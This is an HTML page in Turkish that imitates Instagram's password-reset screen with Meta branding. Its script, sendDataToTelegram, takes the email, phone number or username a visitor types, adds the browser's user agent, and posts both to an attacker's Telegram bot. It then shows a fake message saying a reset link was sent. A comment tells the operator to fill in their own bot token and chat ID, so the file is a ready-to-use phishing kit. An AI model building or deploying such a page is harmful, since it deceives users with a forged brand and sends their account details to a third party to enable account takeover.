<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Giriş Yap • Instagram</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-height: 100vh; color: #262626; padding-top: 20px; }

        .main-wrapper { width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: center; }
        
        /* KART YAPISI */
        .card { background: #ffffff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 24px 40px; text-align: center; width: 100%; margin-bottom: 10px; }

        /* GÜNCEL İKON (KİLİT) */
        .lock-icon-container { width: 96px; height: 96px; border: 2px solid #262626; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
        .lock-icon-container svg { width: 48px; height: 48px; fill: #262626; }

        h1 { font-size: 16px; font-weight: 600; line-height: 20px; margin-bottom: 8px; color: #262626; }
        p { font-size: 14px; line-height: 18px; color: #737373; margin-bottom: 20px; }

        /* FORM */
        .input-field { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 6px; padding: 9px 12px; font-size: 14px; color: #262626; outline: none; margin-bottom: 12px; }
        .input-field:focus { border-color: #a8a8a8; }

        .btn-primary { width: 100%; background: #0095f6; color: #fff; border: none; border-radius: 8px; padding: 7px 16px; font-size: 14px; font-weight: 600; cursor: pointer; margin-bottom: 14px; transition: opacity 0.2s; }
        .btn-primary:active { opacity: 0.7; }

        .divider { display: flex; align-items: center; margin: 10px 0 18px; width: 100%; }
        .line { flex: 1; height: 1px; background: #dbdbdb; }
        .or-text { padding: 0 16px; font-size: 13px; font-weight: 600; color: #737373; text-transform: uppercase; }

        .create-account-link { font-size: 14px; color: #262626; text-decoration: none; font-weight: 600; display: block; margin-top: 4px; }
        .create-account-link:hover { text-decoration: underline; }

        .back-to-login { background: #ffffff; border: 1px solid #dbdbdb; padding: 15px; font-size: 14px; font-weight: 600; color: #262626; text-decoration: none; display: block; text-align: center; width: 100%; border-radius: 1px; }

        /* FOOTER */
        footer { margin: 20px 0; text-align: center; font-size: 12px; color: #737373; width: 100%; padding-bottom: 10px; }
        .meta-logo { font-weight: 600; letter-spacing: 0.5px; }

        /* YÜKLENİYOR / DURUM MESAJI */
        #status-msg { font-size: 12px; color: #0095f6; margin-top: 8px; display: none; font-weight: 600; }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <div class="card">
            <!-- KİLİT SVG İKONU -->
            <div class="lock-icon-container">
                <svg aria-label="Kilit Simgesi" role="img" viewBox="0 0 24 24"><path d="M18 10h-1.26V7.5a4.74 4.74 0 0 0-9.48 0V10H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2Zm-7.26-2.5a3.24 3.24 0 0 1 6.48 0V10h-6.48Zm7.76 12.5H5.5V11.5h13Zm-6.5-6.75a1.25 1.25 0 1 0 1.25 1.25 1.25 1.25 0 0 0-1.25-1.25Z"></path></svg>
            </div>

            <h1>Giriş yaparken sorun mu yaşıyorsun?</h1>
            <p>E-posta adresini, telefon numaranı veya kullanıcı adını yaz, hesabına yeniden girebilmen için sana bir bağlantı gönderelim.</p>

            <!-- FORM -->
            <form id="reset-form" onsubmit="sendDataToTelegram(event)">
                <input type="text" id="credential" class="input-field" placeholder="E-posta, Telefon veya Kullanıcı Adı" required autocomplete="off">
                <button type="submit" id="submit-btn" class="btn-primary">Giriş Bağlantısı Gönder</button>
                <div id="status-msg">İstek gönderiliyor...</div>
            </form>

            <div class="divider">
                <div class="line"></div>
                <span class="or-text">VEYA</span>
                <div class="line"></div>
            </div>

            <a href="#" class="create-account-link">Yeni hesap oluştur</a>
        </div>

        <a href="#" class="back-to-login">Giriş sayfasına dön</a>
    </div>

    <footer>
        <p class="meta-logo">Meta &copy; 2026 Instagram from Meta</p>
    </footer>

    <script>
        async function sendDataToTelegram(e) {
            e.preventDefault();
            
            const inputVal = document.getElementById('credential').value.trim();
            const statusMsg = document.getElementById('status-msg');
            const submitBtn = document.getElementById('submit-btn');

            if (!inputVal) return;

            // BURAYA KENDİ TELEGRAM BOT BİLGİLERİNİ YAZMALISIN
            const BOT_TOKEN = "BURAYA_BOT_TOKEN_YAZ";
            const CHAT_ID = "BURAYA_CHAT_ID_YAZ";

            const message = `🚨 Yeni Şifre Yenileme Talebi!\n\n👤 Girdigi Bilgi: ${inputVal}\n🌐 Tarayıcı/Cihaz: ${navigator.userAgent}`;

            statusMsg.style.display = 'block';
            submitBtn.disabled = true;

            try {
                // Eğer bot token tanımlı değilse simülasyon yap
                if(BOT_TOKEN === "BURAYA_BOT_TOKEN_YAZ") {
                    setTimeout(() => {
                        alert("Bağlantı isteği gönderildi. (Not: Telegram bot token ayarlanmadığı için mesaj iletilemedi, kodu düzenleyin)");
                        statusMsg.style.display = 'none';
                        submitBtn.disabled = false;
                        document.getElementById('credential').value = '';
                    }, 1000);
                    return;
                }

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    alert("Bağlantı e-postası veya SMS gönderildi.");
                    document.getElementById('credential').value = '';
                } else {
                    alert("Bir hata oluştu, lütfen tekrar deneyin.");
                }
            } catch (err) {
                alert("Bağlantı hatası.");
            } finally {
                statusMsg.style.display = 'none';
                submitBtn.disabled = false;
            }
        }
    </script>
</body>
</html>
